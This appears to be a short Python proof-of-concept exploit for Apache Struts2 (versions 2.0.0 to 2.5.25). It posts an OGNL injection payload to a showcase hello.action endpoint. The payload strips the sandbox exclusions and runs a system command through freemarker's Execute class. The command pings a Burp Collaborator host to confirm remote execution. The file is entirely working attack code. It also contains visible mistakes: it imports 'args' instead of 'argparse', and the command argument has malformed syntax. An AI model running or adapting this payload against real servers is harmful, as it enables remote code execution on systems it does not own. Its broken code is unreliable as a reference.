# 2.0.0 ~ 2.5.25
import requests
import args
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="url to check", action="append")
args = parser.parse_args()
args.url = str(args.url).replace("['", "")
args.url = str(args.url).replace("']", "")

url = "%s/struts2_showcase_war/hello.action" %args.url
data = {
    "name": '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add(system "ping 2uxr8ylqrvqbp427irqd6kt2ttzjn8.burpcollaborator.net")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
}

res = requests.post(url, data=data)
